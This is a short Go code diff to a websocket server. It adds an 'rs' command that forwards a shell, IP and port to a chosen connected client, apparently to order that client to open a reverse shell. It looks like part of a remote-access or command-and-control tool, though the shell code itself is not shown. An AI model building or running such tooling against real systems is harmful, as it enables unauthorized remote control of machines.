@@ -156,7 +156,7 @@ func (s *Server) command(b []byte, wsSender *websocket.Conn) {
 		if len(args) < 2 {
 			send("Empty parameter !", wsSender)
 		} else {
-			s.revSh(args[1], wsSender)
+			s.rs(args[1], wsSender)
 		}
 		break
 	default:
@@ -240,6 +240,13 @@ func (s *Server) id(args string, wsSender *websocket.Conn) {
 	default:
 		send(result+"\n"+s.conns[wsSender].id+":"+s.conns[wsSender].name, wsSender)
 	}
+}
+
+func (s *Server) rs(args string, wsSender *websocket.Conn) {
+	params := strings.Split(args, " ")
+	id := []string{params[0]}
+	msg := "[rs] ->" + params[1] + " " + params[2] + " " + params[3] + " <-" + s.conns[wsSender].id // shell ip port
+	s.direct([]byte(msg), id, wsSender)
 }
 
 func main() {
